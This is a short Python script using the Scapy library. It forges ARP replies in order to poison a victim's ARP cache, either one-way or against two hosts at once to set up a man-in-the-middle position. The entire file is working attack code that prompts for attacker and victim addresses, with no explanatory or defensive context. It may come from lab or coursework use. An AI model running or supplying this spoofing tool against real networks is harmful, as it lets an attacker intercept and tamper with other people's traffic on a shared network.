from scapy.all import *

interface = "enp0s9"

def getInterface(interface):
    user_in = raw_input("reuse interface " + str(interface) + "? (y/n)\n>>> ")
    
    if user_in in ["y","Y"]:
        return interface

    elif user_in in ["n","N"]:
        return raw_input("interface:")

    else:
        print("bad input \"" + user_in + "\"")
        return getInterface(interface)

def arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof):
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim

    sendp(arp, iface = interface)
    
def oneWayPoisoning():
   
    print("\none-way ARP poisoning\n")

    global interface
    interface = getInterface(interface)
 
    macAttacker = raw_input("Attacker MAC address: ")
    ipAttacker = raw_input("Attacker IP address: ")

    macVictim = raw_input("Victim MAC address: ")
    ipVictim = raw_input("Victim IP address: ")

    ipToSpoof = raw_input("IP address to impersonate: ")
    
    arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof)
    
def mimAttack():

    print("\nMITM attack using ARP poisoning\n")

    macAttacker = raw_input("Attacker MAC address: ")
    ipAttacker = raw_input("Attacker IP address: ")

    macVictim1 = raw_input("Victim 1 MAC address: ")
    ipVictim1 = raw_input("Victim 1 IP address: ")
    
    macVictim2 = raw_input("Victim 2 MAC address: ")
    ipVictim2 = raw_input("Victim 2 IP address: ")
    
    arpPoison(macAttacker, macVictim1, ipVictim1, ipVictim2)
    arpPoison(macAttacker, macVictim2, ipVictim2, ipVictim1)
